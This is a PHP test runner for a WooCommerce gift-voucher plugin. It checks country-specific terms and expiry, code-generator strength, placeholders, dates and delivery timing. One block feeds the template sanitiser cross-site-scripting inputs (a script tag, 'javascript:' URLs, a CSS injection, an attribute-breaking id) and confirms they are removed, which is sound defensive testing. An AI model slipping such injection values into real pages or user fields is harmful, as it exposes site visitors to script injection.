<?php
/**
 * Lightweight test runner (no WordPress needed):  php tests/run.php [output-dir]
 */
require __DIR__ . '/stubs.php';

use VCAP\CodeGenerator;
use VCAP\CouponManager;
use VCAP\Delivery;
use VCAP\PdfRenderer;
use VCAP\Placeholders;
use VCAP\ProductConfig;
use VCAP\SpreadsheetReader;
use VCAP\TemplatePostType;
use VCAP\Tickets;
use VCAP\Voucher;

$out    = $argv[1] ?? sys_get_temp_dir() . '/vcap-test-output';
@mkdir( $out, 0777, true );
$failed = 0;
$passed = 0;
function check( string $name, bool $ok, string $detail = '' ): void {
	global $failed, $passed;
	$ok ? $passed++ : $failed++;
	echo ( $ok ? "  ✔ " : "  ✘ " ) . $name . ( $ok || '' === $detail ? '' : " — $detail" ) . "\n";
}

echo "Country conditions\n";
$parsed = ProductConfig::terms_by_country( "at: Gültig 30 Jahre.\nKeine Barauszahlung.\nDE: Gültig 3 Jahre.\n\nxx-invalid line" );
check( 'conditions per country are parsed in blocks', array( 'AT' => "Gültig 30 Jahre.\nKeine Barauszahlung.", 'DE' => "Gültig 3 Jahre.\n\nxx-invalid line" ) === $parsed, json_encode( $parsed ) );
$q12 = ProductConfig::terms_by_country( "DE: Gültig 3 Jahre.\nNB: Keine Barauszahlung.\nOK: gilt auch online.\nAT: Gültig 30 Jahre." );
check( 'Q12: only ISO country codes start a block – "NB: …" stays part of the German conditions', array( 'DE' => "Gültig 3 Jahre.\nNB: Keine Barauszahlung.\nOK: gilt auch online.", 'AT' => 'Gültig 30 Jahre.' ) === $q12, json_encode( $q12 ) );
check( 'Q12: lines that are not used are found for the save notice (text before the first block, unreadable validity lines)', array( 'Allgemein: gilt überall' ) === ProductConfig::unassigned_terms_lines( "Allgemein: gilt überall\n\nDE: x" ) && array( 'DE: drei Jahre', 'NB: 5' ) === VCAP\Markets::unparsed_expiry_lines( "DE: drei Jahre\nAT: 30\n\nNB: 5" ) && ! VCAP\Markets::is_country_code( 'NB' ) && VCAP\Markets::is_country_code( 'ch' ) );
$GLOBALS['vcap_test_options']['vcap_terms_by_country'] = "AT: Austria terms";
$GLOBALS['vcap_test_options']['vcap_default_terms']    = 'General terms';
check( 'the billing country picks its conditions', 'Austria terms' === ProductConfig::terms( ProductConfig::DEFAULTS, 'at' ) );
check( 'other countries use the general conditions', 'General terms' === ProductConfig::terms( ProductConfig::DEFAULTS, 'DE' ) );
check( 'product conditions always win', 'Own' === ProductConfig::terms( array( 'redemption_terms' => 'Own' ) + ProductConfig::DEFAULTS, 'AT' ) );
unset( $GLOBALS['vcap_test_options']['vcap_terms_by_country'], $GLOBALS['vcap_test_options']['vcap_default_terms'] );

echo "EU markets (configuration, not code)\n";
check( 'all 27 EU countries are configured', 27 === count( array_filter( array_keys( VCAP\Markets::all() ), array( VCAP\Markets::class, 'is_eu' ) ) ) && VCAP\Markets::is_eu( 'fr' ) && ! VCAP\Markets::is_eu( 'US' ) );
$m_ch = VCAP\Markets::get( 'ch' );
check(
	'SET-VC-03: Switzerland, Liechtenstein, United Kingdom and Norway are known countries but not EU members (CHF, de_CH/fr_CH/it_CH; validity not legally checked = null)',
	31 === count( VCAP\Markets::all() ) && is_array( $m_ch ) && 'CHF' === $m_ch['currency'] && array( 'de_CH', 'fr_CH', 'it_CH' ) === $m_ch['languages'] && null === $m_ch['voucher_expiry'] && null === VCAP\Markets::expiry_rule( 'CH' )
		&& 'CHF' === VCAP\Markets::get( 'LI' )['currency'] && 'GBP' === VCAP\Markets::get( 'GB' )['currency'] && 'NOK' === VCAP\Markets::get( 'NO' )['currency'] && array( 'de_AT' ) === VCAP\Markets::get( 'AT' )['languages']
		&& VCAP\Markets::known( 'CH' ) && VCAP\Markets::known( 'gb' ) && VCAP\Markets::known( 'DE' ) && ! VCAP\Markets::known( 'US' ) && ! VCAP\Markets::known( '' )
		&& ! VCAP\Markets::is_eu( 'CH' ) && ! VCAP\Markets::is_eu( 'LI' ) && ! VCAP\Markets::is_eu( 'GB' ) && ! VCAP\Markets::is_eu( 'NO' ) && VCAP\Markets::is_eu( 'DE' ),
	json_encode( $m_ch )
);
$GLOBALS['vcap_test_filters']['vcap_markets'] = array( array( static fn( $m ) => (array) $m + array( 'XK' => array( 'currency' => 'EUR', 'locale' => 'sq' ) ), 1 ) );
VCAP\Markets::reset();
$m_eu_fallback = array( VCAP\Markets::known( 'XK' ), VCAP\Markets::is_eu( 'XK' ), VCAP\Markets::fiscal_receipt( 'XK' ) );
unset( $GLOBALS['vcap_test_filters']['vcap_markets'] );
VCAP\Markets::reset();
check( 'SET-VC-03: a country added by the filter vcap_markets without "eu" flag is known, not EU, no receipt duty', array( true, false, false ) === $m_eu_fallback, json_encode( $m_eu_fallback ) );
$m_rcpt = array();
foreach ( array( 'DE', 'AT:9', 'CH', 'FR', 'US:CA', '' ) as $m_country ) {
	$GLOBALS['vcap_test_options']['woocommerce_default_country'] = $m_country;
	$m_rcpt[ $m_country ] = VCAP\Counter::receipt_required();
}
$GLOBALS['vcap_test_options']['woocommerce_default_country'] = 'CH';
$GLOBALS['vcap_test_filters']['vcap_counter_require_receipt'] = array( array( static fn() => true, 1 ) );
$m_rcpt_filter_ch = VCAP\Counter::receipt_required();
$GLOBALS['vcap_test_options']['woocommerce_default_country'] = 'DE';
$GLOBALS['vcap_test_filters']['vcap_counter_require_receipt'] = array( array( static fn() => false, 1 ) );
$m_rcpt_filter_de = VCAP\Counter::receipt_required();
$GLOBALS['vcap_test_options'][ VCAP\Counter::REQUIRE_RECEIPT ] = 'no';
unset( $GLOBALS['vcap_test_filters']['vcap_counter_require_receipt'] );
$m_rcpt_no_de = VCAP\Counter::receipt_required();
unset( $GLOBALS['vcap_test_options']['woocommerce_default_country'], $GLOBALS['vcap_test_options'][ VCAP\Counter::REQUIRE_RECEIPT ] );
check(
	'SET-VC-10: automatic receipt number from the market flag "fiscal_receipt": DE and AT yes, CH and FR (and unknown countries) no; the filter vcap_counter_require_receipt wins; "no" stays no',
	array( 'DE' => true, 'AT:9' => true, 'CH' => false, 'FR' => false, 'US:CA' => false, '' => false ) === $m_rcpt && true === $m_rcpt_filter_ch && false === $m_rcpt_filter_de && false === $m_rcpt_no_de
		&& VCAP\Markets::fiscal_receipt( 'de' ) && VCAP\Markets::fiscal_receipt( 'AT' ) && ! VCAP\Markets::fiscal_receipt( 'CH' ) && ! VCAP\Markets::fiscal_receipt( 'FR' ),
	json_encode( array( $m_rcpt, $m_rcpt_filter_ch, $m_rcpt_filter_de, $m_rcpt_no_de ) )
);
check( 'currency and locale per country', 'PLN' === VCAP\Markets::get( 'PL' )['currency'] && 'de_AT' === VCAP\Markets::get( 'AT' )['locale'] );
check( 'verified validity: DE 3 years to the end of the year, AT 30 years', array( 'years' => 3, 'end_of_year' => true ) === ProductConfig::statutory_rule( 'DE' ) && array( 'years' => 30, 'end_of_year' => false ) === ProductConfig::statutory_rule( 'AT' ) );
check( 'unverified country: shop default (3 years to the end of the year)', null === VCAP\Markets::expiry_rule( 'FR' ) && array( 'years' => 3, 'end_of_year' => true ) === ProductConfig::statutory_rule( 'FR' ) );
check( 'setting is parsed per line (years, "end", 0 = never)', array( 'FR' => array( 'years' => 5, 'end_of_year' => true ), 'IT' => array( 'years' => 10, 'end_of_year' => false ), 'NL' => array( 'years' => 0, 'end_of_year' => false ) ) === VCAP\Markets::parse_expiry( "fr: 5 end\nIT=10\nNL: 0\nbroken line\nXX" ) );
$GLOBALS['vcap_test_options'][ VCAP\Markets::EXPIRY_OPTION ] = "FR: 5 end\nAT: 1";
check( 'the shop setting wins over the market data', array( 'years' => 5, 'end_of_year' => true ) === ProductConfig::statutory_rule( 'FR' ) && array( 'years' => 1, 'end_of_year' => false ) === ProductConfig::statutory_rule( 'AT' ) );
unset( $GLOBALS['vcap_test_options'][ VCAP\Markets::EXPIRY_OPTION ] );
check( 'ISO 4217 minor units from config/currencies.php', 0 === VCAP\API\V1\RedemptionService::decimals( 'JPY' ) && 3 === VCAP\API\V1\RedemptionService::decimals( 'kwd' ) && 2 === VCAP\API\V1\RedemptionService::decimals( 'EUR' ) && 2 === VCAP\API\V1\RedemptionService::decimals( 'HUF' ) );

echo "Code generator\n";
$code = CodeGenerator::build( array( 'prefix' => 'GIFT', 'suffix' => 'X', 'length' => 8, 'charset' => 'alnum_upper', 'separator' => '-', 'order_ref' => '1042' ) );
check( 'format PREFIX-ORDER-RANDOM-SUFFIX', (bool) preg_match( '/^GIFT-1042-[A-HJ-NP-Z2-9]{8}-X$/', $code ), $code );
check( 'numeric charset', (bool) preg_match( '/^\d{12}$/', CodeGenerator::random( 12, 'numeric' ) ) );
$seen = array();
for ( $i = 0; $i < 5000; $i++ ) {
	$seen[ CodeGenerator::random( 10 ) ] = true;
}
check( 'no collisions in 5000 codes', 5000 === count( $seen ) );
$taken = array( 'A' => true );
$calls = 0;
$unique = CodeGenerator::unique( array( 'length' => 4 ), function ( $c ) use ( &$calls ) { return ++$calls < 3; } );
check( 'unique() retries on collision', 3 === $calls && 4 === strlen( $unique ) );
check( 'minimum length for 2^50: 10 letters/digits, 11 letters, 16 digits, 10 mixed case', 10 === CodeGenerator::min_length( 'alnum_upper' ) && 11 === CodeGenerator::min_length( 'alpha_upper' ) && 16 === CodeGenerator::min_length( 'numeric' ) && 10 === CodeGenerator::min_length( 'alnum' ) );
check( 'K5: mixed case counts case-insensitively like WooCommerce codes (33 characters, 9 of them only ≈ 45 bits)', 33 === CodeGenerator::effective_alphabet( 'alnum' ) && CodeGenerator::bits( 9, 'alnum' ) < 50 && CodeGenerator::bits( 10, 'alnum' ) >= 50 && abs( CodeGenerator::bits( 10, 'alnum' ) - CodeGenerator::estimated_bits( 'ab3defghjk' ) ) < 1.5 );
$money_code = CodeGenerator::build( array( 'prefix' => 'GIFT', 'length' => 8, 'charset' => 'numeric', 'min_bits' => CodeGenerator::MIN_BITS ) );
check( 'codes that carry money are lengthened to the minimum guessing space', (bool) preg_match( '/^GIFT-\d{16}$/', $money_code ), $money_code );
check( 'other codes keep the configured length', (bool) preg_match( '/^\d{8}$/', CodeGenerator::build( array( 'length' => 8, 'charset' => 'numeric' ) ) ) );
check( 'estimated guessing space of imported codes (8 digits weak, 16 digits / 10 alphanumerics enough)', CodeGenerator::estimated_bits( '12345678' ) < 50 && CodeGenerator::estimated_bits( '1234-5678-9012-3456' ) >= 50 && CodeGenerator::estimated_bits( 'K7QM2X9ZPA' ) >= 50 );
$affixes = CodeGenerator::common_affixes( array( 'SHOP-2026-48151623', 'shop-2026-99990000', 'SHOP-2026-12121212' ) );
check( 'a prefix shared by the whole batch does not count', array( 'shop-2026-', '' ) === $affixes && CodeGenerator::estimated_bits( 'SHOP-2026-48151623', $affixes[0], $affixes[1] ) < 50, json_encode( $affixes ) );
$affixes = CodeGenerator::common_affixes( array( 'GIFT2026000001', 'gift2026000002', 'GIFT2026000317' ) );
check( 'the shared prefix is taken away character by character, not only up to a separator', array( 'gift2026000', '' ) === $affixes && CodeGenerator::estimated_bits( 'GIFT2026000317', $affixes[0], $affixes[1] ) < 15, json_encode( $affixes ) );
check( 'a shared suffix is found after the prefix', array( 'a-', '-x' ) === CodeGenerator::common_affixes( array( 'A-12-X', 'a-34-x', 'A-56-X' ) ) );
$random_batch = array();
for ( $i = 0; $i < 50; $i++ ) {
	$random_batch[] = CodeGenerator::random( 12 );
}
check( 'random codes share no prefix or suffix and keep their full length', array( '', '' ) === CodeGenerator::common_affixes( $random_batch ) );
$rated = CodeGenerator::analyse_batch( $random_batch );
check( 'a batch of random codes is strong and no series', ! $rated['sequential'] && min( $rated['bits'] ) >= 50, json_encode( array( $rated['sequential'], min( $rated['bits'] ) ) ) );
$digits_batch = array();
for ( $i = 0; $i < 50; $i++ ) {
	$digits_batch[] = 'CARD-' . CodeGenerator::random( 18, 'numeric' );
}
$rated = CodeGenerator::analyse_batch( $digits_batch );
check( 'random 18-digit numbers are no series', ! $rated['sequential'] && ! $rated['check_digit'] && min( $rated['bits'] ) >= 50 );
$series = array();
for ( $i = 0; $i < 40; $i++ ) {
	$series[] = sprintf( 'GIFT-%016d', 4000123412340000 + 7919 * $i );
}
$rated = CodeGenerator::analyse_batch( $series );
check( 'evenly spaced numbers are a series and count as weak', $rated['sequential'] && 0.0 === max( $rated['bits'] ) );
$wide = array();
for ( $i = 0; $i < 30; $i++ ) {
	$wide[] = sprintf( '%016d', 1000000000000000 + 299999999999989 * $i ); // No shared prefix, 16 digits each.
}
$rated = CodeGenerator::analyse_batch( $wide );
check( 'a series with a large step is found although no prefix is shared', '' === $rated['prefix'] && $rated['sequential'] && 0.0 === max( $rated['bits'] ) );
$jitter = array();
$next   = 5000000000000000;
for ( $i = 0; $i < 30; $i++ ) {
	$next    += 100000000000000 + random_int( 0, 1000000000000 );
	$jitter[] = (string) $next;
}
check( 'nearly constant steps (low variance) are a series', CodeGenerator::analyse_batch( $jitter )['sequential'] );
$close = array();
$next  = 7300000000000000;
for ( $i = 0; $i < 30; $i++ ) {
	$next   += random_int( 1, 40 );
	$close[] = 'X' . $next . 'Y';
}
$close[] = 'X' . CodeGenerator::random( 16, 'numeric' ) . 'Y'; // One random number in the file keeps the prefix empty.
$rated = CodeGenerator::analyse_batch( $close );
check( 'numbers much closer together than random ones are part of a series', count( array_filter( $rated['bits'], static fn( $b ) => $b < 50 ) ) >= 30, json_encode( $rated['prefix'] ) );
$luhn = array();
foreach ( range( 1, 20 ) as $i ) {
	$base = CodeGenerator::random( 15, 'numeric' );
	for ( $d = 0; $d < 10 && ! CodeGenerator::luhn_valid( $base . $d ); $d++ ) {
	}
	$luhn[] = $base . $d;
}
$rated = CodeGenerator::analyse_batch( $luhn );
check( 'a Luhn check digit is recognised and adds no guessing space (16 digits with check digit are weak)', CodeGenerator::luhn_valid( '4111111111111111' ) && ! CodeGenerator::luhn_valid( '4111111111111112' ) && $rated['check_digit'] && max( $rated['bits'] ) < 50 && max( $rated['bits'] ) > 49 );
check( 'GS1/EAN check digits are recognised', CodeGenerator::gs1_valid( '4006381333931' ) && ! CodeGenerator::gs1_valid( '4006381333932' ) );
$mixed = array();
for ( $i = 1; $i <= 20; $i++ ) {
	$mixed[] = 'KQ' . CodeGenerator::random( 12, 'alpha_upper' ) . '-' . sprintf( '%05d', $i );
}
$rated = CodeGenerator::analyse_batch( $mixed );
check( 'a numbered part counts as 0 bits, random letters around it still count', $rated['sequential'] && min( $rated['bits'] ) > 50 && min( $rated['bits'] ) < 12 * log( 26, 2 ) + 1 );
$existing = array();
for ( $i = 0; $i < 20; $i++ ) {
	$existing[] = sprintf( 'GIFT-%016d', 4000123412340000 + $i );
}
$single = CodeGenerator::analyse_batch( array( 7 => 'GIFT-4000123412340020' ), $existing );
check( 'a single code is rated with the structure of the codes already in the batch', 'gift-40001234123400' === $single['prefix'] && $single['bits'][7] < 50, json_encode( $single ) );
$single = CodeGenerator::analyse_batch( array( 'GIFT-' . CodeGenerator::random( 20, 'numeric' ) ), array( 'GIFT-' . CodeGenerator::random( 20, 'numeric' ), 'GIFT-' . CodeGenerator::random( 20, 'numeric' ) ) );
check( 'a single random code next to random codes of the batch stays strong', ! $single['sequential'] && $single['bits'][0] >= 50, json_encode( $single ) );
check( 'a single code without other codes keeps its full length', CodeGenerator::analyse_batch( array( '1234567890123456' ) )['bits'][0] >= 50 );
// M12-26: the alphabet is what the batch really uses – hex codes of 10 characters are 40 bits, not 52.
$hex_batch = array();
for ( $i = 0; $i < 20; $i++ ) {
	$hex_batch[] = strtoupper( bin2hex( random_bytes( 5 ) ) );
}
$rated = CodeGenerator::analyse_batch( $hex_batch );
check( 'M12-26: a hex batch of 10 characters counts as weak (16 characters seen, about 40 bits)', max( $rated['bits'] ) < 50 && max( $rated['bits'] ) <= 10 * log( 16, 2 ) + 0.01, json_encode( max( $rated['bits'] ) ) );
check( 'M12-26: a single code says nothing about the alphabet (full letters and digits)', CodeGenerator::analyse_batch( array( 'K7QM2X9ZPA' ) )['bits'][0] >= 50 && 0 === CodeGenerator::alphabet_seen( array( 'k7qm2x9zpa' ) ) );
$rated = CodeGenerator::analyse_batch( array( 7 => strtoupper( bin2hex( random_bytes( 5 ) ) ) ), $hex_batch );
check( 'M12-26: one more hex code is rated with the alphabet of the codes already in the batch', $rated['bits'][7] < 50, json_encode( $rated['bits'] ) );

echo "Design sanitising\n";
$dirty = array(
	'page'     => array( 'format' => 'EVIL', 'orientation' => 'sideways', 'background' => 'red;background:url(x)', 'width' => 5000 ),
	'elements' => array(
		array( 'type' => 'script', 'text' => 'x' ),
		array( 'type' => 'text', 'id' => 'a"><b', 'text' => '<script>alert(1)</script>Hi {coupon_code}', 'color' => 'javascript:x', 'font' => 'Comic Sans', 'size' => '12', 'bold' => 1 ),
		array( 'type' => 'image', 'src' => 'javascript:alert(1)', 'fit' => 'cover' ),
	),
);
$clean = TemplatePostType::sanitize_design( $dirty );
check( 'unknown format falls back to A5', 'A5' === $clean['page']['format'] );
check( 'bad colour replaced', '#000000' === $clean['page']['background'] );
check( 'unknown element type dropped', 2 === count( $clean['elements'] ) );
check( 'script tags stripped from text', 'alert(1)Hi {coupon_code}' === $clean['elements'][0]['text'], $clean['elements'][0]['text'] );
check( 'id sanitised', 'ab' === $clean['elements'][0]['id'] );
check( 'unknown font removed', ! isset( $clean['elements'][0]['font'] ) );
check( 'javascript: URL removed', '' === $clean['elements'][1]['src'] );

echo "Page sizes\n";
check( 'A5 landscape = 210×148', array( 210, 148 ) === PdfRenderer::page_size( array( 'format' => 'A5', 'orientation' => 'landscape' ) ) );
check( 'A6 portrait = 105×148', array( 105, 148 ) === PdfRenderer::page_size( array( 'format' => 'A6', 'orientation' => 'portrait' ) ) );
check( 'custom clamps to ≥20mm', array( 20, 99 ) == PdfRenderer::page_size( array( 'format' => 'custom', 'width' => 3, 'height' => 99 ) ) );

echo "Placeholders\n";
$v                  = new Voucher();
$v->code            = 'GIFT-ABCD-1234';
$v->initial_amount  = 50;
$v->balance         = 32.5;
$v->usage_mode      = 'balance';
$v->currency        = 'EUR';
$v->expires_at      = '2027-12-31 22:59:59';
$v->buyer_name      = 'Anna Käufer';
$v->recipient_name  = 'Jörg Empfänger';
$v->message         = "Alles Gute zum Geburtstag!\nGenieß den Tag – mit Ümläuten & Sonderzeichen ✓";
$v->fields          = array( 'dedication' => array( 'label' => 'Widmung', 'value' => 'Für die Beste' ) );
$v->created_at      = '2026-11-11 10:00:00';
$v->token           = str_repeat( 'a', 48 );
$v->max_checkins    = 2;
$text = Placeholders::replace( '{coupon_code}|{coupon_value}|{coupon_balance}|{expiry_date}|{recipient_name}|{field:dedication}|{unknown}|{site_name}', $v );
check( 'static + dynamic tokens', "GIFT-ABCD-1234|50,00\u{a0}€|32,50\u{a0}€|31.12.2027|Jörg Empfänger|Für die Beste|{unknown}|Café Süß & Co" === $text, $text );
$v2 = clone $v;
$v2->discount_type = 'percent';
$v2->initial_amount = 15;
check( 'percent value', '15%' === Placeholders::replace( '{coupon_value}', $v2 ) );

echo "Local dates (datetime-local / date fields in the shop's time zone)\n";
$berlin = new DateTimeZone( 'Europe/Berlin' );
$ny     = new DateTimeZone( 'America/New_York' );
$utc    = new DateTimeZone( 'UTC' );
check( 'Berlin winter: 19:00 stays 19:00 (18:00 UTC)', '2026-12-24 19:00' === VCAP\LocalDate::format( '2026-12-24T19:00', 'Y-m-d', 'H:i', $berlin ) && strtotime( '2026-12-24 18:00:00 UTC' ) === VCAP\LocalDate::timestamp( '2026-12-24T19:00', $berlin ) );
check( 'Berlin summer: 19:00 stays 19:00 (17:00 UTC)', '2026-07-24 19:00' === VCAP\LocalDate::format( '2026-07-24T19:00', 'Y-m-d', 'H:i', $berlin ) && strtotime( '2026-07-24 17:00:00 UTC' ) === VCAP\LocalDate::timestamp( '2026-07-24T19:00', $berlin ) );
check( 'New York date only: same day, local midnight (05:00 UTC), no time appended', '24.12.2026' === VCAP\LocalDate::format( '2026-12-24', 'd.m.Y', 'H:i', $ny ) && strtotime( '2026-12-24 05:00:00 UTC' ) === VCAP\LocalDate::timestamp( '2026-12-24', $ny ) );
check( 'UTC: date and time unchanged', '2026-12-24 19:00' === VCAP\LocalDate::format( '2026-12-24T19:00', 'Y-m-d', 'H:i', $utc ) && strtotime( '2026-12-24 19:00:00 UTC' ) === VCAP\LocalDate::timestamp( '2026-12-24 19:00', $utc ) );
check( 'invalid dates and other text are not local dates', null === VCAP\LocalDate::parse( '2026-02-31' ) && null === VCAP\LocalDate::parse( '2026-12-24T24:00' ) && null === VCAP\LocalDate::parse( 'tomorrow' ) && '' === VCAP\LocalDate::format( 'next week', 'Y-m-d' ) );
$GLOBALS['vcap_test_options']['time_format'] = 'H:i';
check( '{event_date}: 19:00 in the shop time zone stays 19:00 (winter and summer)', '24.12.2026 19:00' === Placeholders::local_date( '2026-12-24T19:00' ) && '24.07.2026 19:00' === Placeholders::local_date( '2026-07-24T19:00' ), Placeholders::local_date( '2026-12-24T19:00' ) . ' / ' . Placeholders::local_date( '2026-07-24T19:00' ) );
check( '{event_date} date only and free text', '24.12.2026' === Placeholders::local_date( '2026-12-24' ) && 'Spring 2027' === Placeholders::local_date( 'Spring 2027' ) && '' === Placeholders::local_date( '' ) );
$v3         = clone $v;
$v3->fields = array( 'delivery_date' => array( 'label' => 'Delivery date', 'value' => '2026-12-24' ) );
$v3->delivery_at  = null;
$v3->delivered_at = '2026-11-10 09:00:00';
check( '{delivery_date} without a planned delivery shows the day it went out, never an unused chosen date', '10.11.2026' === Placeholders::replace( '{delivery_date}', $v3 ), Placeholders::replace( '{delivery_date}', $v3 ) );
unset( $GLOBALS['vcap_test_options']['time_format'] );

check( 'caller metadata cannot seed internal redemption bookkeeping', array( 'order' => 7 ) === VCAP\API\V1\RedemptionService::caller_meta( array( '_refunds' => array( 'x' => 49.99 ), '_state' => 1, 'order' => 7 ) ) && array() === VCAP\API\V1\RedemptionService::caller_meta( 'x' ) );
check( 'redemption amounts use ISO currency decimals', 0 === VCAP\API\V1\RedemptionService::decimals( 'JPY' ) && 2 === VCAP\API\V1\RedemptionService::decimals( 'EUR' ) && 3 === VCAP\API\V1\RedemptionService::decimals( 'kwd' ) );

echo "Expiry & delivery\n";
$base = strtotime( '2026-01-10 12:00:00 UTC' );
check( 'expiry in days (shop-local end of day)', '2026-02-09 22:59:59' === ProductConfig::expiry_for( array_merge( ProductConfig::DEFAULTS, array( 'expiry_mode' => 'days', 'expiry_days' => 30 ) ), $base ) );
check( 'never expires', null === ProductConfig::expiry_for( array_merge( ProductConfig::DEFAULTS, array( 'expiry_mode' => 'never' ) ), $base ) );
$GLOBALS['vcap_test_options']['woocommerce_default_country'] = 'DE:BY';
check( 'statutory default (Germany): 3 years to the end of the year', 'statutory' === ProductConfig::default_expiry_rule() && '2029-12-31 22:59:59' === ProductConfig::expiry_for( ProductConfig::DEFAULTS, $base ) );
$GLOBALS['vcap_test_options']['woocommerce_default_country'] = 'AT';
check( 'statutory default (Austria): 30 years', '2056-01-10 22:59:59' === ProductConfig::expiry_for( ProductConfig::DEFAULTS, $base ) );
check( 'statutory default by the buyer country, whatever the shop country: AT buyer 30 years, DE buyer 3 years to the end of the year', '2056-01-10 22:59:59' === ProductConfig::expiry_for( ProductConfig::DEFAULTS, $base, 'AT' ) && '2029-12-31 22:59:59' === ProductConfig::expiry_for( ProductConfig::DEFAULTS, $base, 'DE' ) );
$GLOBALS['vcap_test_options']['vcap_default_expiry_days'] = 365;
check( 'a saved default in days is kept after the update', 'days' === ProductConfig::default_expiry_rule() && '2027-01-10 22:59:59' === ProductConfig::expiry_for( ProductConfig::DEFAULTS, $base ) );
unset( $GLOBALS['vcap_test_options']['vcap_default_expiry_days'], $GLOBALS['vcap_test_options']['woocommerce_default_country'] );
check( 'fixed expiry date (local end of day)', '2027-03-01 22:59:59' === ProductConfig::expiry_for( array_merge( ProductConfig::DEFAULTS, array( 'expiry_mode' => 'date', 'expiry_date' => '2027-03-01' ) ), $base ) );
$future = wp_date( 'Y-m-d', time() + 10 * DAY_IN_SECONDS );
$cust   = Delivery::compute_time( array_merge( ProductConfig::DEFAULTS, array( 'delivery' => 'customer' ) ), array( 'delivery_date' => array( 'value' => $future ) ) );
check( 'customer delivery date at 08:00 local', $cust && wp_date( 'Y-m-d H:i', strtotime( $cust . ' UTC' ) ) === $future . ' 08:00', (string) $cust );
check( 'past date delivers immediately', null === Delivery::compute_time( array_merge( ProductConfig::DEFAULTS, array( 'delivery' => 'date', 'delivery_date' => '2020-01-01' ) ), array() ) );
check( 'immediate', null === Delivery::compute_time( ProductConfig::DEFAULTS, array() ) );
$delay = Delivery::compute_time( array_merge( ProductConfig::DEFAULTS, array( 'delivery' => 'delay', 'delivery_delay_days' => 3 ) ), array() );
check( 'relative delay ≈ +3 days', $delay && abs( strtotime( $delay . ' UTC' ) - ( time() + 3 * DAY_IN_SECONDS ) ) < 5 );
$field_on = array( 'builtin_fields' => array( 'recipient_name', 'delivery_date' ) );
$imm_date = Delivery::compute_time( array_merge( ProductConfig::DEFAULTS, $field_on ), array( 'delivery_date' => array( 'value' => $future ) ) );
check( 'delivery date field with "immediately": the customer date is used', $imm_date && wp_date( 'Y-m-d H:i', strtotime( $imm_date . ' UTC' ) ) === $future . ' 08:00', (string) $imm_date );
$del_date = Delivery::compute_time( array_merge( ProductConfig::DEFAULTS, $field_on, array( 'delivery' => 'delay', 'delivery_delay_days' => 3 ) ), array( 'delivery_date' => array( 'value' => $future ) ) );
check( 'delivery date field with a delay: a filled customer date wins', $del_date && wp_date( 'Y-m-d', strtotime( $del_date . ' UTC' ) ) === $future, (string) $del_date );
$del_empty = Delivery::compute_time( array_merge( ProductConfig::DEFAULTS, $field_on, array( 'delivery' => 'delay', 'delivery_delay_days' => 3 ) ), array( 'delivery_date' => array( 'value' => '' ) ) );
check( 'delivery date field left empty: the product delivery applies', $del_empty && abs( strtotime( $del_empty . ' UTC' ) - ( time() + 3 * DAY_IN_SECONDS ) ) < 5 );
check( 'field switched off: a stray date is ignored', null === Delivery::compute_time( ProductConfig::DEFAULTS, array( 'delivery_date' => array( 'value' => $future ) ) ) );
check( 'customer date enabled by mode or field', Delivery::customer_date_enabled( array( 'delivery' => 'customer' ) ) && Delivery::customer_date_enabled( array( 'delivery' => 'immediate', 'builtin_fields' => array( 'delivery_date_required' ) ) ) && ! Delivery::customer_date_enabled( ProductConfig::DEFAULTS ) );
$valid30 = array_merge( ProductConfig::DEFAULTS, array( 'expiry_mode' => 'days', 'expiry_days' => 30 ) );
check( 'last delivery date: the expiry day (valid 30 days, delivered at 08:00)', wp_date( 'Y-m-d', strtotime( ProductConfig::expiry_for( $valid30, $base ) . ' UTC' ) ) === Delivery::latest_delivery_date( $valid30, $base ) && '2026-02-09' === Delivery::latest_delivery_date( $valid30, $base ), (string) Delivery::latest_delivery_date( $valid30, $base ) );
check( 'last delivery date: none for vouchers that never expire', null === Delivery::latest_delivery_date( array_merge( ProductConfig::DEFAULTS, array( 'expiry_mode' => 'never' ) ), $base ) );
$GLOBALS['vcap_test_filters']['vcap_delivery_min_validity_days'] = array( array( static fn() => 7, 1 ) );
check( 'last delivery date keeps a minimum validity (filter)', '2026-02-02' === Delivery::latest_delivery_date( $valid30, $base ) );
unset( $GLOBALS['vcap_test_filters']['vcap_delivery_min_validity_days'] );
$late = Delivery::delivery_after_expiry( array_merge( $valid30, array( 'delivery' => 'delay', 'delivery_delay_days' => 45 ) ), $base );
check( 'delay after the validity is reported', is_array( $late ) && '2026-02-24' === $late['delivery'] && '2026-02-09' === $late['expiry'], json_encode( $late ) );
check( 'delay within the validity is fine', null === Delivery::delivery_after_expiry( array_merge( $valid30, array( 'delivery' => 'delay', 'delivery_delay_days' => 10 ) ), $base ) );
$fixed_late = Delivery::delivery_after_expiry( array_merge( ProductConfig::DEFAULTS, array( 'expiry_mode' => 'date', 'expiry_date' => '2030-12-31', 'delivery' => 'date', 'delivery_date' => '2031-01-15' ) ), $base );
check( 'fixed delivery date after a fixed expiry date is reported', is_array( $fixed_late ) && '2031-01-15' === $fixed_late['delivery'] && '2030-12-31' === $fixed_late['expiry'], json_encode( $fixed_late ) );
check( 'retry pauses grow from 15 minutes to at most a day', 900 === Delivery::retry_delay( 1 ) && 1800 === Delivery::retry_delay( 2 ) && 3600 === Delivery::retry_delay( 3 ) && DAY_IN_SECONDS === Delivery::retry_delay( 9 ) && DAY_IN_SECONDS === Delivery::retry_delay( 40 ) );
check( 'deliveries are given up after 12 failed attempts by default', 12 === Delivery::max_attempts() );
check( 'maintenance runs cheap purges first and mails last', 'tmp_pdfs' === Delivery::MAINTENANCE_STEPS[0] && 'expiry_reminders' === Delivery::MAINTENANCE_STEPS[ count( Delivery::MAINTENANCE_STEPS ) - 1 ] && in_array( 'delivery_net', Delivery::MAINTENANCE_STEPS, true ) );

echo "PDF rendering\n";
// A small PNG for image/background tests.
$img = imagecreatetruecolor( 300, 200 );
imagefill( $img, 0, 0, imagecolorallocate( $img, 230, 210, 180 ) );
imagefilledellipse( $img, 150, 100, 160, 160, imagecolorallocate( $img, 31, 58, 77 ) );
$png = $GLOBALS['vcap_test_uploads'] . '/2026/11/logo.png';
@mkdir( dirname( $png ), 0777, true );
imagepng( $img, $png );
$GLOBALS['vcap_test_attachments'][77] = $png;

$designs                                = TemplatePostType::default_designs();
$designs['giftcard']['elements'][]      = array( 'id' => 'logo', 'type' => 'image', 'imageId' => 77, 'x' => 18, 'y' => 60, 'w' => 38, 'h' => 30, 'fit' => 'contain' );
$designs['giftcard']['elements'][]      = array( 'id' => 'bc', 'type' => 'barcode', 'x' => 120, 'y' => 128, 'w' => 45, 'h' => 12, 'qrValue' => '{coupon_code}', 'color' => '#333333' );
